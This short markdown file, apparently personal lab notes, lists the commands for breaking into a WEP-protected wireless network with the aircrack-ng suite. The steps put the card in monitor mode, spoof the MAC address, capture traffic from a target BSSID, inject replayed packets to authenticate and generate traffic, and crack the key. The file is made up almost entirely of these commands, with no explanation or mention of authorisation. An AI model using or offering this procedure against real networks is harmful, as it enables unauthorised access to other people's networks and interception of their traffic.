
# Steps to intrude into WEP Network

## [w1]
```
sudo airmon-ng start wlp2s0
```
## [w1]
```
sudo ifconfig wlp2s0mon down
```

## [w1]
```
sudo macchanger wlp2s0mon 12:34:45:67:89:01
```

## [w1]
```
sudo airodump-ng wlp2s0mon
```

## [w2]
```
sudo airodump-ng -c 6 -w to_break_educational --bssid E8:94:F6:F2:F1:E1 wlp2s0mon
```

## [w3]
```
sudo aireplay-ng -1 600 -a E8:94:F6:F2:F1:E1 -h 12:34:45:67:89:01 wlp2s0mon
```

## [w3]
```
sudo aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b E8:94:F6:F2:F1:E1 -h 12:34:45:67:89:01 wlp2s0mon
```

## [W4]
```
sudo aircrack-ng to_break_educational-01.cap
```
